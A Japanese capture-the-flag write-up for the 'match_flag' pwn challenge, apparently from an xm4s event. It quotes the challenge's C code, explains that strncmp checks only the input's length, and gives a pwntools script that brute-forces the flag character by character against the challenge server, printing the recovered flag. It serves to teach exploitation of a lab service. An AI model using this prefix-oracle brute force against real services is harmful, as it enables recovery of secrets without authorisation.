# match_flag:Pwn:71pts
彼はフラグを隠し持っているらしい。 僕たちに直接教えてくはくれないが、フラグが正解かどうかは教えてくれるそうだ！ ...どうやって聞き出そうか。  
```
nc 27.133.155.191 30009
```
[main.c](main.c)  

# Solution
main.cは以下のようだ。  
```c:main.c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

int main() {
	// set up for CTF
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
	alarm(60);

	FILE *fp = fopen("./flag.txt", "r");
	if(fp == NULL) {
		puts("flag.txt not found!");
		exit(0);
	}
	char flag[0x100];
	fgets(flag, 0x100, fp);

	char input[0x100];
	fgets(input, 0x100, stdin);
	int len = strlen(input) - 1;

	if(strncmp(flag, input, len) == 0) {
		puts("Correct!!!");
	} else {
		puts("Incorrect...");
	}
}
```
入力がflagの先頭と部分一致している場合、"Correct!!!"が返ってくる。  
そのため、一文字ずつ先頭から決定できる。  
以下のffflag.pyで行う。  
```python:ffflag.py
import pwn

flag = ""

while True:
    for i in "abcdefghijklmnopqrstuvwxyz0123456789{}_ ":
        io = pwn.remote("27.133.155.191", 30009)
        io.sendline(flag+i)
        if b"Correct!!!" in io.recv():
            flag += i
            break
        io.close()
    if "}" in flag:
        print(flag)
        break
```
実行する。  
```bash
$ python ffflag.py
~~~
xm4s{you got flag finaly hahaha}
```
flagが得られた。  

## xm4s{you got flag finaly hahaha}